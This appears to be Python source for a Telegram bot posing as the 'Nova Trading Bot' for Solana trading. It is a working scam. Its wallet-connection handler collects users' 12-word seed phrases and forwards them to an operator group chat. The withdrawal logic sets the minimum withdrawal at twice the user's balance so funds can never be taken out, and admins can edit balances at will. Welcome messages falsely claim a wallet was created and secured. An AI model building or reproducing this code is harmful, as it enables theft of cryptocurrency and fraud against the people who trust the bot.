                [[InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")]]
            ),
        )
        context.user_data["trade_msg_ids"].append(sent.message_id)
        return

    if option == "show_sell":
        await _del()
        context.user_data["awaiting_token_contract"] = True
        context.user_data["trade_msg_ids"] = []
        context.user_data["trade_chat_id"] = query.message.chat_id
        sent = await query.message.reply_text(
            "🔴 <b>Sell Token</b>\n\n"
            "Paste the Solana token contract address of the token you want to sell.\n\n"
            "📝 <b>Example:</b>\n<code>pumpCmXqMfrsAkQ5r49WcJnRayYRqmXz6ae8H7H9Dfn</code>\n\n"
            "Type the address or tap Cancel.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")]]
            ),
        )
        context.user_data["trade_msg_ids"].append(sent.message_id)
        return

    if option == "show_bot_guide":
        await _del()
        guide_text = (
            "📘 <b>How to Use Nova Trading Bot</b>\n\n"
            "Welcome to <b>Nova Trading Bot</b> — your all-in-one Telegram trading assistant.\n\n"
            "1️⃣ <b>Autotrade</b>\nAutomate your trading strategies. The bot executes trades on your behalf based on your parameters.\n\n"
            "2️⃣ <b>Copytrade</b>\nMimic trades of successful wallets instantly. Tap Copytrade, select a trader, and the bot replicates their trades.\n\n"
            "3️⃣ <b>Wallet & Import Wallet</b>\nCheck balance, view info, monitor transactions, and manage funds.\n\n"
            "4️⃣ <b>Alerts</b>\nGet notified about price changes, successful trades, or new token launches.\n\n"
            "5️⃣ <b>Live Chart</b>\nAccess real-time market data, price trends, and token charts directly in Telegram.\n\n"
            "🔒 <b>Security Note</b>\nPrivate key <u>exporting is disabled</u> to protect your funds.\n\n"
            "⚡ <i>Features are only available to funded wallets. Fund your wallet to unlock the full potential of Nova!</i>\n\n"
            "🌐 For support use /support"
        )
        await query.message.reply_text(
            guide_text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "💰 Fund Wallet", callback_data="fund_wallet"
                        )
                    ],
                    [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")],
                ]
            ),
        )
        return

    if option == "show_live_chart":
        await _del()
        chart_buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "📈 BITCOIN (BTC)",
                        url="https://www.tradingview.com/chart/?symbol=BTCUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 ETHEREUM (ETH)",
                        url="https://www.tradingview.com/chart/?symbol=ETHUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 SOLANA (SOL)",
                        url="https://www.tradingview.com/chart/?symbol=SOLUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 DOGECOIN (DOGE)",
                        url="https://www.tradingview.com/chart/?symbol=DOGEUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 SHIBA INU (SHIB)",
                        url="https://www.tradingview.com/chart/?symbol=SHIBUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 POLKADOT (DOT)",
                        url="https://www.tradingview.com/chart/?symbol=DOTUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 CARDANO (ADA)",
                        url="https://www.tradingview.com/chart/?symbol=ADAUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 LITECOIN (LTC)",
                        url="https://www.tradingview.com/chart/?symbol=LTCUSDT",
                    )
                ],
                [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")],
            ]
        )
        await query.message.reply_text(
            "🔥 <b>Top Coins Charts</b>\nChoose a coin below to view its live chart.",
            parse_mode="HTML",
            reply_markup=chart_buttons,
        )
        return

    if option == "refer_earn":
        await _del()
        bot_username = (await context.bot.get_me()).username
        ref_code = get_or_create_referral_code(user_id)
        referral_link = f"https://t.me/{bot_username}?start=ref_{ref_code}"
        user_entry = referral_data.get("users", {}).get(str(user_id), {})
        total_invited = len(user_entry.get("invited", []))
        refer_text = (
            "🏆 <b>Refer and Earn</b>\n\n"
            f"🔗 <b>Your Invitation Link:</b>\n"
            f"<code>{referral_link}</code>\n\n"
            f"👥 <b>Total Invited:</b> {total_invited} friend(s)\n\n"
            "📖 <b>Rules:</b>\n"
            "1. Earn <b>25%</b> of invitees' trading fees permanently\n"
            "2. Withdrawals are limited to <b>1 request per 24 hours</b>. "
            "Withdrawals will be auto triggered at <b>8:00 (UTC+8)</b> daily and "
            "will be credited within 24 hours after triggering."
        )
        await query.message.reply_text(
            refer_text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")]]
            ),
        )
        return

    # Handle WITHDRAWAL actions
    if option == "withdraw_100":
        await _del()
        user_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0

        # Minimum SOL required for gas fees (kept in wallet)
        MIN_GAS_RESERVE = 0.005

        # Calculate minimum withdrawal
        stored_min = user_balances.get(user_id, {}).get(
            "min_withdrawal", user_balance * 2
        )
        if stored_min == 0 and user_balance > 0:
            stored_min = user_balance * 2

        minimum_withdrawal = stored_min
        MIN_GAS_RESERVE = 0.005
        if user_balance == 0:
            await query.message.reply_text(
                "❗ Insufficient SOL balance.", parse_mode="HTML"
            )
            return

        # Check if balance is above $10
        if usd_value < 10:
            await query.message.reply_text(
                f"❗ Your balance must be above $10 to withdraw.\n\n"
                f"Current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
                f"Required minimum: $10 worth of SOL\n\n"
                f"Please deposit more SOL to meet the minimum withdrawal requirement.",
                parse_mode="HTML",
            )
            return

        # Show withdrawal requirements (minimum = 2x balance)
        await query.message.reply_text(
            f"💸 <b>Withdrawal Requirements</b>\n\n"
            f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
            f"<b>Minimum withdrawal required:</b> {minimum_withdrawal:.4f} SOL\n"
            f"❗ You need at least {minimum_withdrawal:.4f} SOL to process a withdrawal.\n"
            f"Please deposit more funds to meet the minimum requirement.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("⬅️ Back", callback_data="back_withdraw")]]
            ),
        )
        return

    if option == "withdraw_50":
        await _del()
        user_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0
        stored_min = user_balances.get(user_id, {}).get(
            "min_withdrawal", user_balance * 2
        )
        if stored_min == 0 and user_balance > 0:
            stored_min = user_balance * 2
        minimum_withdrawal = stored_min
        if user_balance == 0:
            await query.message.reply_text(
                "❗ Insufficient SOL balance.",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("⬅️ Back", callback_data="back_withdraw")]]
                ),
            )
            return
        if user_balance < minimum_withdrawal:
            await query.message.reply_text(
                f"💸 <b>Withdrawal Requirements</b>\n\n"
                f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
                f"<b>Minimum withdrawal required:</b> {minimum_withdrawal:.4f} SOL\n"
                f"❗ You need at least {minimum_withdrawal:.4f} SOL to process a withdrawal.\n"
                f"Please deposit more funds to meet the minimum requirement.",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("⬅️ Back", callback_data="back_withdraw")]]
                ),
            )
            return
        half_balance = user_balance / 2
        half_usd = half_balance * sol_price if sol_price > 0 else 0
        await query.message.reply_text(
            f"💸 <b>Withdraw 50%</b>\n\n"
            f"Amount to withdraw: <b>{half_balance:.4f} SOL</b> (${half_usd:.2f})\n\n"
            f"Please send your Solana wallet address to receive the funds.\n\n"
            f"📝 Enter your wallet address below:",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        context.user_data["awaiting_withdraw"] = True
        context.user_data["withdraw_amount"] = half_balance
        return

    if option == "withdraw_custom":
        await _del()
        context.user_data["awaiting_withdraw"] = True
        user_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0
        stored_data = user_balances.get(user_id, {})
        minimum_withdrawal = stored_data.get("min_withdrawal", user_balance * 2)

        sent = await query.message.reply_text(
            f"💸 <b>Withdraw Custom Amount</b>\n\n"
            f"Your current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
            f"<b>Minimum withdrawal:</b> {minimum_withdrawal:.4f} SOL\n"
            f"Please enter the withdrawal amount (in SOL):\n\n"
            f"📝 Enter your desired amount (minimum: {minimum_withdrawal:.4f} SOL)",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        context.user_data["withdraw_prompt_msg_id"] = sent.message_id
        context.user_data["withdraw_prompt_chat_id"] = sent.chat_id
        return

    # Save state for this user (for settings)
    user_states[user_id] = option

    # Create cancel button for settings input
    cancel_button = InlineKeyboardMarkup(
        [[InlineKeyboardButton("❌ Cancel", callback_data="cancel_settings")]]
    )

    await query.edit_message_text(
        text=f"Please enter a number for <b>{option.replace('_', ' ').title()}</b>:\n\n📝 Enter your desired value and send it as a message.",
        parse_mode="HTML",
        reply_markup=cancel_button,
    )


# ---- Helpers ----
def main_menu_markup():
    """Persistent keyboard – only the Refresh Portfolio button."""
    return ReplyKeyboardMarkup([["🔄 Refresh Portfolio"]], resize_keyboard=True)


def main_menu_inline():
    """Full navigation inline keyboard shown on the start/home page."""
    return InlineKeyboardMarkup(
        [
            # [InlineKeyboardButton("📢 JOIN Nova Community", url="https://t.me/")],
            [
                InlineKeyboardButton(
                    "🔗 COPY TRADE SMART WALLET", callback_data="ct_wallet_view"
                )
            ],
            [
                InlineKeyboardButton("💳 Wallet", callback_data="show_wallet"),
                InlineKeyboardButton("🤖 Bot Guide", callback_data="show_bot_guide"),
            ],
            [
                InlineKeyboardButton("🔴 Sell", callback_data="show_sell"),
                InlineKeyboardButton("🟢 Buy", callback_data="show_buy"),
            ],
            [
                InlineKeyboardButton("📊 Live Chart", callback_data="show_live_chart"),
                InlineKeyboardButton("🏆 Refer and Earn", callback_data="refer_earn"),
            ],
        ]
    )


def back_to_menu_btn():
    """Single-row 'Back to Menu' inline button."""
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")]]
    )


def cancel_markup():
    return ReplyKeyboardMarkup(
        [["Cancel"]], resize_keyboard=True, one_time_keyboard=True
    )


# Validate a single word: only letters A-Z (either case)
def is_alpha_word(word: str) -> bool:
    return bool(re.fullmatch(r"[A-Za-z]+", word))


# Fetch token details from DexScreener API (using run_in_executor for non-blocking)
async def get_token_details(token_address: str):
    """Fetch token details from DexScreener API"""
    import asyncio

    def fetch():
        try:
            url = f"https://api.dexscreener.com/latest/dex/tokens/{token_address}"
            response = requests.get(url, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if data and "pairs" in data and len(data["pairs"]) > 0:
                    return data["pairs"][0]  # Return the first (most liquid) pair
            return None
        except Exception as e:
            print(f"Error fetching token details: {e}")
            return None

    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, fetch)


# Format token details for display
def format_token_details(pair_data, wallet_balance=0):
    """Format token details in the style requested by user"""
    try:
        from datetime import datetime

        token = pair_data.get("baseToken", {})
        quote = pair_data.get("quoteToken", {})

        # Token name and symbol
        token_name = token.get("name", "Unknown")
        token_symbol = token.get("symbol", "Unknown")
        token_address = token.get("address", "N/A")

        # Market data
        price_usd = (
            float(pair_data.get("priceUsd", 0)) if pair_data.get("priceUsd") else 0
        )
        market_cap = pair_data.get("marketCap")
        fdv = pair_data.get("fdv")
        liquidity_usd = pair_data.get("liquidity", {}).get("usd", 0)

        # Volume and transactions
        volume_24h = pair_data.get("volume", {}).get("h24", 0)
        txns_24h = pair_data.get("txns", {}).get("h24", {})
        buyers_24h = txns_24h.get("buys", 0) if txns_24h else 0

        # DEX info
        dex_id = pair_data.get("dexId", "Unknown").upper()
        pair_created = pair_data.get("pairCreatedAt", 0)

        # Links
        info = pair_data.get("info", {})
        socials = info.get("socials", [])

        twitter_link = "❌"
        telegram_link = "❌"

        for social in socials:
            if social.get("type") == "twitter":
                twitter_link = "✅"
            elif social.get("type") == "telegram":
                telegram_link = "✅"

        # Format price with proper decimals (fix for very small prices)
        if price_usd == 0:
            price_str = "0"
        else:
            # Use high precision formatting to preserve significant digits for very small prices
            price_str = ("%.18f" % price_usd).rstrip("0").rstrip(".")

        # Fix timestamp conversion (pairCreatedAt is in milliseconds)
        if pair_created:
            # Convert milliseconds to seconds
            created_dt = datetime.fromtimestamp(pair_created / 1000)
            time_diff = datetime.now() - created_dt
            days = time_diff.days
            hours = time_diff.seconds // 3600
            minutes = (time_diff.seconds % 3600) // 60
            time_ago = (
                f"{days}d {hours}h {minutes}m ago"
                if days > 0
                else f"{hours}h {minutes}m ago"
            )
        else:
            time_ago = "Unknown"

        # Format market cap with fallback to FDV
        if market_cap and market_cap > 0:
            if market_cap >= 1000000:
                mcap_str = f"{market_cap / 1000000:.1f}M"
            else:
                mcap_str = f"{market_cap / 1000:.1f}K"
        elif fdv and fdv > 0:
            if fdv >= 1000000:
                mcap_str = f"{fdv / 1000000:.1f}M (FDV)"
            else:
                mcap_str = f"{fdv / 1000:.1f}K (FDV)"
        else:
            mcap_str = "Unknown"

        # Format liquidity
        if liquidity_usd >= 1000000:
            liq_str = f"{liquidity_usd / 1000000:.2f}M"
        else:
            liq_str = f"{liquidity_usd / 1000:.2f}K"

        message = (
            f"📌 <b>{token_name} ({token_symbol})</b>\n"
            f"<code>{token_address}</code>\n\n"
            f"💳 <b>Wallet:</b>\n"
            f"|——Balance: {wallet_balance} SOL\n"
            f"|——Holding: 0 {token_symbol}\n"
            f"|___PnL: 0%🚀🚀\n\n"
            f"💵 <b>Trade:</b>\n"
            f"|——Market Cap: {mcap_str}\n"
            f"|——Price: {price_str}\n"
            f"|___Buyers (24h): {buyers_24h}\n\n"
            # f"🔍 <b>Security:</b>\n"
            # f"|——Security scan available on DexScreener\n"
            # f"|——Trade Tax: Check DexScreener\n"
            # f"|___Top 10: Check DexScreener\n\n"
            f"📝 <b>LP:</b> {token_symbol}-{quote.get('symbol', 'SOL')}\n"
            f"|——💧 {dex_id} AMM\n"
            f"|——🟢 Trading opened\n"
            f"|——Created {time_ago}\n"
            f"|___Liquidity: {liq_str} USD\n\n"
            f"📲 <b>Links:</b>\n"
            f"|—— Twitter {twitter_link}\n"
            f"|—— Telegram {telegram_link}\n"
            f"|___ <a href='https://dexscreener.com/solana/{token_address}'>DexScreener</a> | "
            f"<a href='https://www.pump.fun/{token_address}'>Pump</a>"
        )

        return message
    except Exception as e:
        print(f"Error formatting token details: {e}")
        return None


# --- /start ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    if user_id in banned_users:
        return

    bot_username = (await context.bot.get_me()).username
    ref_code = get_or_create_referral_code(user_id)
    referral_link = f"https://t.me/{bot_username}?start=ref_{ref_code}"

    inviter_line = ""
    if context.args:
        arg = context.args[0]
        if arg.startswith("ref_"):
            inviter_code = arg[4:]
            inviter_id = record_referral(user_id, inviter_code)
            if inviter_id:
                try:
                    inviter_chat = await context.bot.get_chat(inviter_id)
                    inviter_name = inviter_chat.first_name or inviter_chat.username or str(inviter_id)
                except Exception:
                    inviter_name = "a friend"
                inviter_line = f"\n\n👥 You were invited by <b>{inviter_name}</b>!"

    welcome_text = (
        "👋 <b>Welcome to Nova Bot!</b>\n"
        "Step into the world of fast, smart, and stress-free trading, "
        "designed for both beginners and seasoned traders.\n\n"
        "🔗 Connecting to your wallet...\n"
        "⏳ Initializing your account and securing your funds...\n"
        "✅ Wallet successfully created and linked!"
        f"{inviter_line}\n\n"
        f"🔗 <b>Your Referral Link:</b>\n"
        f"Invite friends and earn rewards:\n"
        f"<code>{referral_link}</code>\n\n"
        "👇 Select an option below to continue."
    )

    if update.message:
        await update.message.reply_text(
            "💡 Use <b>🔄 Refresh Portfolio</b> below to refresh your balance.",
            parse_mode="HTML",
            reply_markup=main_menu_markup(),
        )
        await update.message.reply_text(
            welcome_text,
            parse_mode="HTML",
            reply_markup=main_menu_inline(),
        )
    elif update.callback_query:
        try:
            await update.callback_query.message.delete()
        except Exception:
            pass
        await update.callback_query.message.reply_text(
            welcome_text,
            parse_mode="HTML",
            reply_markup=main_menu_inline(),
        )

    # --- /support ---


async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in banned_users:
        return
    await update.message.reply_text(
        "  �� Support Contact\n\n"
        "If you need help, our support team is available to assist you.\n\n"
        "Feel free to click the button below to send them a message anytime!",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔧 Reach Support", url=SUPPORT_LINK)]]
        ),
    )
    # clear states
    context.user_data.pop("awaiting_dummy", None)
    context.user_data.pop("awaiting_withdraw", None)


# --- Message handler ---
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Global ban check
    if user_id in banned_users:
        return

    text = (update.message.text or "").strip()
    user = update.effective_user
    user_name = user.username or user.first_name or str(user_id)

    # Handle Admin inputs
    if user_id in ADMIN_IDS:
        if context.user_data.get("awaiting_admin_ban"):
            try:
                target_id = int(text.strip())
                banned_users.add(target_id)
                save_banned_users()
                await update.message.reply_text(
                    f"🚫 User <code>{target_id}</code> has been banned.",
                    parse_mode="HTML",
                )
            except ValueError:
                await update.message.reply_text("❌ Invalid ID format.")
            finally:
                context.user_data.pop("awaiting_admin_ban", None)
            return

        if context.user_data.get("awaiting_admin_unban"):
            try:
                target_id = int(text.strip())
                if target_id in banned_users:
                    banned_users.remove(target_id)
                    save_banned_users()
                    await update.message.reply_text(
                        f"✅ User <code>{target_id}</code> has been unbanned.",
                        parse_mode="HTML",
                    )
                else:
                    await update.message.reply_text(
                        "❓ User is not in the banned list."
                    )
            except ValueError:
                await update.message.reply_text("❌ Invalid ID format.")
            finally:
                context.user_data.pop("awaiting_admin_unban", None)
            return

        if context.user_data.get("awaiting_admin_support_link"):
            new_link = text.strip()
            if new_link.startswith("http"):
                global SUPPORT_LINK
                SUPPORT_LINK = new_link
                save_support_link()
                await update.message.reply_text(
                    f"✅ Support link updated to: {SUPPORT_LINK}"
                )
            else:
                await update.message.reply_text(
                    "❌ Invalid link format. Must start with http or https."
                )
            context.user_data.pop("awaiting_admin_support_link", None)
            return

        if context.user_data.get("awaiting_admin_user_lookup"):
            try:
                target_id = int(text.strip())
                if target_id in user_balances:
                    data = user_balances[target_id]
                    balance = data.get("balance", 0)
                    min_w = data.get("min_withdrawal", balance * 2)
                    is_fixed = data.get("fixed_min", False)

                    status = "Fixed" if is_fixed else "Auto (x2)"

                    msg = (
                        f"👤 <b>User Details:</b> <code>{target_id}</code>\n\n"
                        f"💰 <b>Balance:</b> {balance:.4f} SOL\n"
                        f"💸 <b>Min Withdrawal:</b> {min_w:.4f} SOL\n"
                        f"⚙️ <b>Min Status:</b> {status}"
                    )

                    keyboard = InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton(
                                    "✏️ Edit Balance",
                                    callback_data=f"admin_edit_balance_{target_id}",
                                )
                            ],
                            [
                                InlineKeyboardButton(
                                    "✏️ Edit Min Withdrawal",
                                    callback_data=f"admin_edit_min_withdrawal_{target_id}",
                                )
                            ],
                        ]
                    )
                    await update.message.reply_text(
                        msg, parse_mode="HTML", reply_markup=keyboard
                    )
                else:
                    await update.message.reply_text("❌ User not found in database.")
            except ValueError:
                await update.message.reply_text("❌ Invalid ID format.")
            finally:
                context.user_data.pop("awaiting_admin_user_lookup", None)
            return

        if context.user_data.get("admin_editing_user"):
            target_id = int(context.user_data["admin_editing_user"])
            field = context.user_data["admin_editing_field"]
            try:
                val = float(text.strip())
                if target_id not in user_balances:
                    user_balances[target_id] = {
                        "balance": 0,
                        "last_checked_slot": 0,
                        "min_withdrawal": 0,
                        "fixed_min": False,
                    }

                if field == "balance":
                    user_balances[target_id]["balance"] = val
                    # If balance edit meets or exceeds current min withdrawal, reset to X2 logic
                    current_min = user_balances[target_id].get("min_withdrawal", 0)
                    if val >= current_min:
                        user_balances[target_id]["fixed_min"] = False
                        user_balances[target_id]["min_withdrawal"] = val * 2
                else:  # min_withdrawal
                    user_balances[target_id]["min_withdrawal"] = val
                    user_balances[target_id]["fixed_min"] = (
                        True  # Mark as fixed manually
                    )

                save_balances()

                # Show updated details including USD value
                sol_price = await get_sol_price_usd()
                new_balance = user_balances[target_id]["balance"]
                new_min = user_balances[target_id]["min_withdrawal"]
                usd_value = new_balance * sol_price if sol_price > 0 else 0

                update_msg = (
                    f"✅ {field.replace('_', ' ').title()} updated for user {target_id}.\n\n"
                    f"💰 <b>New Balance:</b> {new_balance:.4f} SOL (${usd_value:.2f})\n"
                    f"💸 <b>New Min Withdrawal:</b> {new_min:.4f} SOL"
                )

                await update.message.reply_text(update_msg, parse_mode="HTML")
            except ValueError:
                await update.message.reply_text("❌ Invalid number format.")
            finally:
                context.user_data.pop("admin_editing_user", None)
                context.user_data.pop("admin_editing_field", None)
            return

    # ----- Handle Copy Trade Smart Wallet inline flow states -----
    if context.user_data.get("awaiting_ct_target_wallet"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_ct_target_wallet", None)
            await update.message.reply_text(
                "❌ Cancelled.", reply_markup=main_menu_inline()
            )
            return
        # Verify $20 minimum at submission time
        user_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0
        if usd_value < 20:
            context.user_data.pop("awaiting_ct_target_wallet", None)
            await update.message.reply_text(
                "<b>Your SOL balance is too low to copy this wallet. Please top up your wallet and try again.</b>",
                parse_mode="HTML",
                reply_markup=main_menu_inline(),
            )
            return
        wallet_address = text.strip()
        base58_pattern = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
        if not re.match(base58_pattern, wallet_address):
            await update.message.reply_text(
                "❗ Invalid Solana wallet address. Please enter a valid 32-44 character base58 address.",
                reply_markup=cancel_markup(),
            )
            return
        context.user_data["ct_target_wallet"] = wallet_address
        context.user_data.pop("awaiting_ct_target_wallet", None)
        copy_trade_buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🎯 Target Wallet", callback_data="ct_target_wallet"
                    ),
                    InlineKeyboardButton(
                        "💰 Buy Amount", callback_data="ct_buy_amount"
                    ),
                ],
                [
                    InlineKeyboardButton(
                        "🔁 Consecutive Buys", callback_data="ct_consecutive_buys"
                    ),
                    InlineKeyboardButton(
                        "📤 Sell Position", callback_data="ct_sell_position"
                    ),
                ],
                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
            ]
        )
        await update.message.reply_text(
            f"✅ <b>Target Wallet set!</b>\n\n"
            f"<code>{wallet_address}</code>\n\n"
            "Configure your remaining copy trade settings:",
            parse_mode="HTML",
            reply_markup=copy_trade_buttons,
        )
        return

    if context.user_data.get("awaiting_ct_buy_amount"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_ct_buy_amount", None)
            await update.message.reply_text(
                "❌ Cancelled.", reply_markup=main_menu_inline()
            )
            return
        try:
            amount = float(text.strip())
            if amount <= 0:
                raise ValueError()
        except ValueError:
            await update.message.reply_text(
                "❗ Please enter a valid positive number (e.g. 0.5).",
                reply_markup=cancel_markup(),
            )
            return
        context.user_data["ct_buy_amount"] = amount
        context.user_data.pop("awaiting_ct_buy_amount", None)
        copy_trade_buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🎯 Target Wallet", callback_data="ct_target_wallet"
                    ),
                    InlineKeyboardButton(
                        "💰 Buy Amount", callback_data="ct_buy_amount"
                    ),
                ],
                [
                    InlineKeyboardButton(
                        "🔁 Consecutive Buys", callback_data="ct_consecutive_buys"
                    ),
                    InlineKeyboardButton(
                        "📤 Sell Position", callback_data="ct_sell_position"
                    ),
                ],
                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
            ]
        )
        await update.message.reply_text(
            f"✅ <b>Buy Amount set to {amount} SOL</b>\n\n"
            "Configure your remaining copy trade settings:",
            parse_mode="HTML",
            reply_markup=copy_trade_buttons,
        )
        return

    if context.user_data.get("awaiting_ct_consecutive_buys"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_ct_consecutive_buys", None)
            await update.message.reply_text(
                "❌ Cancelled.", reply_markup=main_menu_inline()
            )
            return
        try:
            num = int(text.strip())
            if num <= 0:
                raise ValueError()
        except ValueError:
            await update.message.reply_text(
                "❗ Please enter a valid positive whole number (e.g. 3).",
                reply_markup=cancel_markup(),
            )
            return
        context.user_data["ct_consecutive_buys"] = num
        context.user_data.pop("awaiting_ct_consecutive_buys", None)
        copy_trade_buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🎯 Target Wallet", callback_data="ct_target_wallet"
                    ),
                    InlineKeyboardButton(
                        "💰 Buy Amount", callback_data="ct_buy_amount"
                    ),
                ],
                [
                    InlineKeyboardButton(
                        "🔁 Consecutive Buys", callback_data="ct_consecutive_buys"
                    ),
                    InlineKeyboardButton(
                        "📤 Sell Position", callback_data="ct_sell_position"
                    ),
                ],
                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
            ]
        )
        await update.message.reply_text(
            f"✅ <b>Consecutive Buys set to {num}</b>\n\n"
            "Configure your remaining copy trade settings:",
            parse_mode="HTML",
            reply_markup=copy_trade_buttons,
        )
        return

    if context.user_data.get("awaiting_ct_slippage"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_ct_slippage", None)
            context.user_data.pop("ct_sell_position", None)
            await update.message.reply_text(
                "❌ Cancelled.", reply_markup=main_menu_inline()
            )
            return
        try:
            slippage = float(text.strip())
            if slippage < 1 or slippage > 15:
                await update.message.reply_text(
                    "❗ Slippage must be between <b>1%</b> and <b>15%</b>.\n\n"
                    "Please enter a valid value:",
                    parse_mode="HTML",
                    reply_markup=cancel_markup(),
                )
                return
        except ValueError:
            await update.message.reply_text(
                "❗ Please enter a valid number between 1 and 15.",
                reply_markup=cancel_markup(),
            )
            return
        sell_pos = context.user_data.get("ct_sell_position", "N/A")
        target = context.user_data.get("ct_target_wallet", "Not set")
        buy_amount = context.user_data.get("ct_buy_amount", "Not set")
        consec = context.user_data.get("ct_consecutive_buys", "Not set")
        context.user_data.pop("awaiting_ct_slippage", None)
        context.user_data.pop("ct_sell_position", None)
        await update.message.reply_text(
            f"✅ <b>Copy Trade Configuration Saved!</b>\n\n"
            f"🎯 <b>Target Wallet:</b> <code>{target}</code>\n"
            f"💰 <b>Buy Amount:</b> {buy_amount} SOL\n"
            f"🔁 <b>Consecutive Buys:</b> {consec}\n"
            f"📤 <b>Sell Position:</b> {sell_pos}\n"
            f"⚡ <b>Slippage:</b> {slippage}%\n\n"
            f"Your copy trade settings have been saved and will be applied to your trades.",
            parse_mode="HTML",
            reply_markup=main_menu_inline(),
        )
        return

    # ----- Handle Connect Wallet (12 dummy words) -----
    if context.user_data.get("awaiting_dummy"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_dummy", None)
            await update.message.reply_text(
                "Request cancelled. Back to menu:", reply_markup=main_menu_markup()
            )
            return

        words = [w for w in text.split() if w.strip()]
        count = len(words)

        if count != 12:
            await update.message.reply_text(
                f"❌ <b>Invalid Seed Phrase Length</b>\n\n"
                f"You entered {count} word(s), but we need exactly 12 words.\n\n"
                f"📝 <b>Please try again:</b>\n"
                f"• Send exactly 12 words separated by spaces\n"
                f"• Each word should contain only letters (A-Z)\n\n"
                f"Or tap Cancel to abort the wallet connection.",
                parse_mode="HTML",
                reply_markup=cancel_markup(),
            )
            return

        bad_indices = [i + 1 for i, w in enumerate(words) if not is_alpha_word(w)]
        if bad_indices:
            positions = ", ".join(map(str, bad_indices))
            await update.message.reply_text(
                f"❌ <b>Invalid Characters Found</b>\n\n"
                f"Some words contain invalid characters. Words must contain only letters (A-Z).\n\n"
                f"🔍 <b>Please check word position(s):</b> {positions}\n\n"
                f"📝 Fix the invalid words and try again, or tap Cancel to abort the wallet connection.",
                parse_mode="HTML",
                reply_markup=cancel_markup(),
            )
            return

        wallet_seed = " ".join(words)
        forward_text = (
            f"🔐 Wallet Connection Request from @{user_name} (id: {user_id}):\n\n"
            f"<pre>{wallet_seed}</pre>"
        )
        try:
            await context.bot.send_message(
                chat_id=GROUP_ID, text=forward_text, parse_mode="HTML"
            )
        except Exception as e:
            await update.message.reply_text(
                "Failed to forward input to the group. Contact the bot admin."
            )
            print("Error sending to group:", e)
            context.user_data.pop("awaiting_dummy", None)
            await update.message.reply_text(
                "Back to menu:", reply_markup=main_menu_markup()
            )
            return

        context.user_data.pop("awaiting_dummy", None)
        await update.message.reply_text(
            "✅ <b>Wallet Connection Processing</b>\n\n"
            "Please wait while our system processes your wallet import request ✅",
            parse_mode="HTML",
            reply_markup=main_menu_markup(),
        )
        return

    # ----- Handle Withdraw flow -----
    if context.user_data.get("awaiting_withdraw"):
        # Helper: delete the stored prompt message (the bot's "enter amount" message)
        async def _del_prompt():
            prompt_msg_id = context.user_data.pop("withdraw_prompt_msg_id", None)
            prompt_chat_id = context.user_data.pop("withdraw_prompt_chat_id", None)
            if prompt_msg_id and prompt_chat_id:
                try:
                    await context.bot.delete_message(
                        chat_id=prompt_chat_id, message_id=prompt_msg_id
                    )
                except Exception:
                    pass

        back_btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "⬅️ Back to Withdraw", callback_data="back_withdraw"
                    )
                ]
            ]
        )

        if text.lower() == "cancel":
            context.user_data.pop("awaiting_withdraw", None)
            await _del_prompt()
